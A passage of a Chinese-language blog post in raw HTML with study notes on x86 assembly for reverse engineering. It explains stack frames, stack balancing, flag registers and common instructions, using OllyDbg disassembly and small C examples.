的栈底，因为现在到了一个新的函数，但栈顶不需要保存，因为上一个栈帧的顶部讲会是 func 的栈帧底部。（两栈帧相邻的）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101018994.png\" alt=\"image-20221105101018994\"></p>\n<p>到这里，新的栈帧开始了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x4],eax</span><br><span class=\"line\">mov     ecx,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x8],ecx</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101240579.png\" alt=\"image-20221105101240579\"></p>\n<p>retn   ; 返回，然后 8 是什么意思呢，就是参数占用的字节数，当返回后，esp-n，释放参数 m,n 的空间</p>\n<p>由此可见，通过 ebp，能够很容易定位到上面的参数。当从 func 函数返回时，首先 esp 移动到栈帧底部（即释放局部变量），然后把上一个函数的栈帧底部指针弹出到 ebp, 再弹出返回地址到 cs:ip 上，esp 继续移动划过参数，这样，ebp,esp 就回到了调用函数前的状态，即现在恢复了原来的 main 的栈帧</p>\n<p>大佬的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1R1eGVkb0xpbnV4L2FydGljbGUvZGV0YWlscy8xMDA5MjE5OTQ=\">栈帧 ebp,esp 详解_TuxedoLinux 的博客 - CSDN 博客_ebp esp</span></p>\n<h4 id=\"提升堆栈\"><a class=\"markdownIt-Anchor\" href=\"#提升堆栈\">#</a> <strong>提升堆栈</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x40</span><br></pre></td></tr></table></figure>\n<p>将堆栈提升了 0x40</p>\n<p>将 esp 的值减去 0x40=64，我们这里的相差的数据宽度为 4 即 16,64/4=16，因此堆栈图里多了 16 格（蓝色部分），这种操作常被叫做<strong>提升堆栈</strong>，此时堆栈图为：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228212917496.png\" alt=\"image-20210228212917496\" style=\"zoom:50%;\" />\n<p>此时 ESP 指向新的栈顶，蓝色区域为我们 CALL 0040100A 之后新的栈，下面的区域为原来的栈</p>\n<p>此时蓝色中的数据为脏数据，因为栈中放的是临时数据，可能是之前没有清理的数据</p>\n<h4 id=\"保护现场\"><a class=\"markdownIt-Anchor\" href=\"#保护现场\">#</a> <strong>保护现场</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>将 ebx、esi、edi 三个通用寄存器保存到堆栈中，前面的 push ebp 其实也属于保护现场</p>\n<h4 id=\"初始化提升的堆栈\"><a class=\"markdownIt-Anchor\" href=\"#初始化提升的堆栈\">#</a> <strong>初始化提升的堆栈</strong></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401069  |.  8D7D B8       lea     edi,dword ptr ss:[ebp-0x48]  ;就是将刚开始的esp给的edi</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12     ;ecx是为了之后的rep做准备的，ecx是rep循环次数</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC     ;使用CC防止缓冲溢出</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]  ;将eax的值赋值给edi所指向的内存地址里的值，并且每执行一次edi都会增加4（D标志位为0所以是增加</span><br></pre></td></tr></table></figure>\n<p>这里将我们提升的堆栈中的内容全部初始化为 CCCCCCCC</p>\n<p>为什么是初始化为 CC？防止<strong>缓冲</strong>溢出</p>\n<p>CC 的<strong>硬编码</strong>对应的指令为 int 3，即断点</p>\n<p>这么做有什么好处呢？当程序执行超过缓冲区时，遇到 int 3 就会自动停下来</p>\n<h4 id=\"执行实际的内容\"><a class=\"markdownIt-Anchor\" href=\"#执行实际的内容\">#</a> 执行实际的内容</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401058 |. 8B45 08    mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">0040105B |. 0345 0C    add eax,dword ptr ss:[ebp+0xC]</span><br></pre></td></tr></table></figure>\n<p>就是将前面压入的参数 2 和 1 进行相加得到 3</p>\n<h4 id=\"恢复现场\"><a class=\"markdownIt-Anchor\" href=\"#恢复现场\">#</a> 恢复现场</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401145  |.  5F            pop     edi</span><br><span class=\"line\">00401146  |.  5E            pop     esi</span><br><span class=\"line\">00401147  |.  5B            pop     ebx</span><br><span class=\"line\">00401148  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040114A  |.  5D            pop     ebp</span><br></pre></td></tr></table></figure>\n<p>与前面保护现场相对应</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228224826624.png\" alt=\"image-20210228224826624\" style=\"zoom:50%;\" />\n<h4 id=\"返回\"><a class=\"markdownIt-Anchor\" href=\"#返回\">#</a> 返回</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040114B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<h4 id=\"call返回后\"><a class=\"markdownIt-Anchor\" href=\"#call返回后\">#</a> CALL 返回后</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040112B  |.  83C4 0C       add     esp,0xC</span><br></pre></td></tr></table></figure>\n<p>作用为平衡堆栈</p>\n<p>注意 CALL 之前和 CALL 之后，其前后环境要一致，这就是所谓的<strong>堆栈平衡</strong></p>\n<h4 id=\"堆栈平衡\"><a class=\"markdownIt-Anchor\" href=\"#堆栈平衡\">#</a> 堆栈平衡</h4>\n<p>如果通过堆栈传递参数了。那么在程序执行完毕后，要平衡因参数导致的堆栈变化</p>\n<p>当我们使用堆栈传参的时候，在程序执行完毕后这些参数应该一起被清理掉，也就是加了几条参数，就要在堆栈中加几个地址，这么做可以理解为清理垃圾。</p>\n<p>处理方法：</p>\n<p>第一种 ：在函数外部添加 ADD 处理</p>\n<p>第二种：在函数内部添加 ret8</p>\n<h4 id=\"逆推c语言代码\"><a class=\"markdownIt-Anchor\" href=\"#逆推c语言代码\">#</a> 逆推 C 语言代码</h4>\n<p>根据我们前面的分析，我们不难发现这其实就是个简单的加法函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func(int m, int n) &#123;</span><br><span class=\"line\">    int a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTM3OTk1Mi0xLTEuaHRtbA==\">逆向基础笔记七 堆栈图（重点） - 『软件调试区』 - 吾爱破解 - LCG - LSG | 安卓破解 | 病毒分析 | www.52pojie.cn</span></p>\n<p>我们最后在总结一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">;现在到了一个新的函数，需要有自己的栈底，因此需要把上一个栈底保存起来，栈顶不用保存，因为栈顶是新函数的栈底</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">;堆栈提升</span><br><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br><span class=\"line\">;保护现场，为了retn后回恢复</span><br><span class=\"line\">00401069  |.  8D7D B8       lea     edi,[local.18]</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">;初始化堆栈，防止脏数据</span><br><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     [local.1],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">;形参压入栈中</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">;调用add函数</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">;堆栈平衡，将esp带回call以前的位置，call之前push了两次，2*4=8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\">;嗲用printf函数，操作和上面调用add一样</span><br><span class=\"line\">004010A0  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">;堆栈平衡</span><br><span class=\"line\">004010A3  |.  33C0          xor     eax,eax</span><br><span class=\"line\">004010A5  |.  5F            pop     edi</span><br><span class=\"line\">004010A6  |.  5E            pop     esi</span><br><span class=\"line\">004010A7  |.  5B            pop     ebx</span><br><span class=\"line\">;恢复现场</span><br><span class=\"line\">004010A8  |.  83C4 48       add     esp,0x48</span><br><span class=\"line\">004010AB  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">004010AD  |.  E8 9E000000   call    _chkesp</span><br><span class=\"line\">004010B2  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">004010B4  |.  5D            pop     ebp</span><br><span class=\"line\">004010B5  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>分配堆栈向下减少。堆栈传递参数向上相加</p>\n<h4 id=\"堆栈结构图重点\"><a class=\"markdownIt-Anchor\" href=\"#堆栈结构图重点\">#</a> 堆栈结构图（重点）</h4>\n<ol>\n<li>调用 CALL 又可以分为六个部分：</li>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>执行实际内容</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<h3 id=\"如何右键启动od\"><a class=\"markdownIt-Anchor\" href=\"#如何右键启动od\">#</a> 如何右键启动 od</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181646294.png\" alt=\"image-20221108181646294\"></p>\n<p>通过以上方式右键启动 od</p>\n<h3 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181822816.png\" alt=\"image-20221108181822816\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108193731856.png\" alt=\"image-20221108193731856\" style=\"zoom:80%;\" />\n<ol>\n<li>进位标志 CF (Carry Flag)</li>\n<li>奇偶标志 PF (Parity  Flag)</li>\n<li>辅助进位标志 AF (Auxiliary  Carry Flag)</li>\n<li>零标志 ZF (Zero  Flag)</li>\n<li>符号标志 SF (Sign  Flag)</li>\n<li>溢出标志 OF (Overflow  Flag)</li>\n<li>方向标志 DF (Direction Flag)</li>\n</ol>\n<h4 id=\"进位标志cfcarry-flag\"><a class=\"markdownIt-Anchor\" href=\"#进位标志cfcarry-flag\">#</a> 进位标志 CF (Carry Flag)</h4>\n<p>如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为 1，否则其值为 0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"奇偶标志pfparity-flag\"><a class=\"markdownIt-Anchor\" href=\"#奇偶标志pfparity-flag\">#</a> 奇偶标志 PF (Parity Flag)</h4>\n<p>奇偶标志 PF 用于反映运算结果中<strong>最低有效字节</strong>中 “1” 的个数的奇偶性，如果 “1” 的个数为偶数，则 PF 的值为 1，否则其值为 0。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AX,803</span><br><span class=\"line\">ADD AX,1</span><br><span class=\"line\">0x804: 0000 1000 0000 0100        总共2个1 ,PF应为1，但实际运行结果PF为0</span><br><span class=\"line\">因为PF是根据最低有效字节来看，即804后面04的这部分</span><br></pre></td></tr></table></figure>\n<h4 id=\"辅助进位标志afauxiliary-carry-flag\"><a class=\"markdownIt-Anchor\" href=\"#辅助进位标志afauxiliary-carry-flag\">#</a> 辅助进位标志 AF (Auxiliary Carry Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：</span><br><span class=\"line\"></span><br><span class=\"line\">在字操作时，发生低字节向高字节进位或借位时</span><br><span class=\"line\">在字节操作时，发生低4位向高4位进位或借位时</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>AF 与<strong>数据宽度</strong>相关</p>\n<p>32 位时 FFFF <strong>F</strong> FFF</p>\n<p>16 位时 FF <strong>F</strong> F</p>\n<p>8 位时 F <strong>F</strong></p>\n<p>加黑的字体为 AF 标志位判断的位置，如果该位置要向前进位则 AF 为 1，否则为 0，和 CF 相似，不过判断的位置不同</p>\n</blockquote>\n<h4 id=\"零标志zfzero-flag\"><a class=\"markdownIt-Anchor\" href=\"#零标志zfzero-flag\">#</a> 零标志 ZF (Zero Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">零标志ZF用来反映运算结果是否为0</span><br><span class=\"line\">如果运算结果为0，则其值为1，否则其值为0</span><br><span class=\"line\">作用：在判断运算结果是否为0时，可使用此标志位</span><br><span class=\"line\">XOR EAX,EAX   //通过xor将eax清零，会改变zf标志位为1</span><br><span class=\"line\">MOV EAX,0     //通过MOV将EAX赋值为0，非运算，不改变zf标志位</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"符号标志sfsign-flag\"><a class=\"markdownIt-Anchor\" href=\"#符号标志sfsign-flag\">#</a> 符号标志 SF (Sign Flag)</h4>\n<blockquote>\n<p>符号标志 SF 用来反映运算结果的符号位，它与运算结果的最高位相同</p>\n</blockquote>\n<h4 id=\"溢出标志ofoverflow-flag\"><a class=\"markdownIt-Anchor\" href=\"#溢出标志ofoverflow-flag\">#</a> 溢出标志 OF (Overflow Flag)</h4>\n<blockquote>\n<p>溢出标志 OF 用于反映有符号数加减运算所得结果是否溢出</p>\n<p>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</p>\n<p>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</p>\n<ul>\n<li>正 + 正 = 正 如果结果是负数，则说明有溢出</li>\n<li>负 + 负 = 负 如果结果是正数，则说明有溢出</li>\n<li>正 + 负 永远都不会有溢出</li>\n</ul>\n<p>CPU 如何计算 OF</p>\n<ul>\n<li>符号位有进位</li>\n<li>最高有效数值位向符号位产生的进位</li>\n</ul>\n<p>对于一个有符号数：如 0x80 和 0xC0</p>\n<p>符号位有进位</p>\n<p>0x80:<strong>1</strong> 000 0000</p>\n<p>0xC0:<strong>1</strong> 100 0000</p>\n<p>最高有效数值位向符号位产生的进位</p>\n<p>0x80:1 <strong>0</strong> 00 0000</p>\n<p>0xC0:1 <strong>1</strong> 00 0000</p>\n<p>就是运算 0x80+0xc0</p>\n<p>0x80:<strong>1</strong> <strong>0</strong> 00 0000</p>\n<p>0xC0:<strong>1</strong> <strong>1</strong> 00 0000</p>\n<p>符号位 1+1 有产生进位，于是符号位有进位为 1</p>\n<p>最高有效数值位向符号位产生的进位 0+1 没有产生进位，于是最高有效数值位向符号位产生的进位为 0</p>\n<p><strong>OF = 符号位有进位 xor 最高有效数值位向符号位产生的进位</strong></p>\n<p>OF = 1 xor 0 = 1 所以此时 OF=1</p>\n</blockquote>\n<h4 id=\"方向标志dfdirection-flag\"><a class=\"markdownIt-Anchor\" href=\"#方向标志dfdirection-flag\">#</a> 方向标志 DF (Direction Flag)</h4>\n<blockquote>\n<p>DF=1 时串操作为减地址方式 DF=0 为增地址方式</p>\n</blockquote>\n<h3 id=\"相关汇编指令\"><a class=\"markdownIt-Anchor\" href=\"#相关汇编指令\">#</a> 相关汇编指令</h3>\n<blockquote>\n<p>ADC 指令：带进位加法</p>\n<p>SBB 指令：带借位减法</p>\n<p>XCHG 指令：交换数据</p>\n<p>格式：XCHG R/M,R/M 两边不能同时为内存  <strong>数据宽度</strong>要一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AL,1</span><br><span class=\"line\">MOV CL,2</span><br><span class=\"line\">XCHG AL,CL</span><br><span class=\"line\">执行前：AL=1 CL=2</span><br><span class=\"line\">执行后：AL=2 CL=1</span><br></pre></td></tr></table></figure>\n<p>MOVS 指令：移动数据 内存 - 内存</p>\n<p>MOVS 指令常用于复制字符串</p>\n<p>可以将不同宽度的指令简写为 movsb movsw movsd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV EDI,12FFD8</span><br><span class=\"line\">MOV ESI,12FFD0</span><br><span class=\"line\">MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]</span><br><span class=\"line\">EDI内存里的值被修改为ESI内存里的值，且EDI和ESI各加4,和DOWRD数据宽度相关，如果为WORD 则各加2</span><br><span class=\"line\">由DF（Direction Flag）方向标志位决定，当DF位为1时为减，当DF位为0时，则为加</span><br></pre></td></tr></table></figure>\n<p>movsx 操作数 A，操作数 B  符号扩展传送</p>\n<p>movzx 零扩展传送</p>\n<p>movsx，movzx 操作数 A 的空间必须大于操作数 b</p>\n<p>如果大的给小的，会产生截断</p>\n<p>STOS 指令</p>\n<p>将 Al/AX/EAX 的值存储到 [EDI] 指定的内存单元，和<strong>数据宽度</strong>相关</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">STOS BYTE PTR ES:[EDI]                将AL存储到[EDI]</span><br><span class=\"line\">STOS WORD PTR ES:[EDI]                将AX存储到[EDI]</span><br><span class=\"line\">STOS DWORD PTR ES:[EDI]                将EAX存储到[EDI]</span><br><span class=\"line\">注意这里使用的是ES</span><br><span class=\"line\">当后面为[EDI]时要使用ES</span><br><span class=\"line\">存储完数据后EDI地址的变化方向也受DF标志控制，1减0增</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">现在在看看这几行代码，先把eax的值变为cccccccc，stos将其存储到es中，通过rep循环存储</span><br></pre></td></tr></table></figure>\n<p>REP 指令</p>\n<p>按计数寄存器 (ECX) 中指定的次数重复执行指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV ECX,10</span><br><span class=\"line\">REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]        也可以写成REP MOVSD</span><br><span class=\"line\">代码将会重复执行16次</span><br><span class=\"line\">因为每执行一次EDI和ESI都会变化4，变化方向由DF决定</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h3 id=\"跳转和比较指令\"><a class=\"markdownIt-Anchor\" href=\"#跳转和比较指令\">#</a> 跳转和比较指令</h3>\n<h4 id=\"jcc指令\"><a class=\"markdownIt-Anchor\" href=\"#jcc指令\">#</a> JCC 指令</h4>\n<blockquote>\n<p>cc 代表 condition code (状态码)</p>\n<p>Jcc 不是单个指令，它只是描述了跳转之前检查条件代码的跳转助记符</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031210918994.png\" alt=\"image-20221031210918994\" style=\"zoom: 50%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MucHJpbmNldG9uLmVkdS9jb3Vyc2VzL2FyY2hpdmUvZmFsbDEyL2NvczM3NS9JQTMySmNjLnBkZg==\">https://www.cs.princeton.edu/courses/archive/fall12/cos375/IA32Jcc.pdf</span></p>\n<p>JCC 指令用于改变 EIP（CPU 要读取的指令地址）</p>\n</blockquote>\n<h4 id=\"jmp指令\"><a class=\"markdownIt-Anchor\" href=\"#jmp指令\">#</a> JMP 指令</h4>\n<p>JMP 指令：修改 EIP 的值</p>\n<p>JMP 指令只影响了 EIP，不影响堆栈和其它通用寄存器</p>\n<p>JMP 寄存器 / 立即数相当于 MOV EIP, 寄存器 / 立即数</p>\n<h4 id=\"call指令\"><a class=\"markdownIt-Anchor\" href=\"#call指令\">#</a> CALL 指令</h4>\n<p>CALL 指令和 JMP 指令都会修改 EIP 的值</p>\n<p>但 CALL 指令会将返回地址（CALL 指令的下一条指令地址）压入堆栈</p>\n<p>因此也会引起 esp 的变化</p>\n<h4 id=\"ret指令\"><a class=\"markdownIt-Anchor\" href=\"#ret指令\">#</a> RET 指令</h4>\n<p>call 调用跳转后执行完相关代码完要返回到 call 的下一条指令时使用 ret 指令</p>\n<p>ret 指令相当于 pop eip</p>\n<h4 id=\"cmp指令\"><a class=\"markdownIt-Anchor\" href=\"#cmp指令\">#</a> CMP 指令</h4>\n<p>指令格式：CMP R/M,R/M/IMM</p>\n<p>CMP 指令只改变标志寄存器的值</p>\n<p>该指令是比较两个操作数，实际上，它相当于 SUB 指令，但是相减的结果并不保存到第一个操作数中</p>\n<p>只是根据相减的结果来改变 ZF 零标志位的，当两个操作数相等的时候，零标志位置 1</p>\n<h4 id=\"test指令\"><a class=\"markdownIt-Anchor\" href=\"#test指令\">#</a> TEST 指令</h4>\n<p>指令格式：TEST R/M,R/M/IMM</p>\n<p>该指令在一定程度上和 CMP 指令时类似的，两个数值进行与操作，结果不保存，但是会改变相应标志位</p>\n<p>常见用法：用这个指令，可以确定某寄存器是否等于 0</p>\n<p>观察 ZF（零标志位）就可以判断 EAX 是否为 0</p>\n<h3 id=\"if指令编译结果\"><a class=\"markdownIt-Anchor\" href=\"#if指令编译结果\">#</a> if 指令编译结果</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a = 1;</span><br><span class=\"line\">\tif (a == 1) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,11);</span><br><span 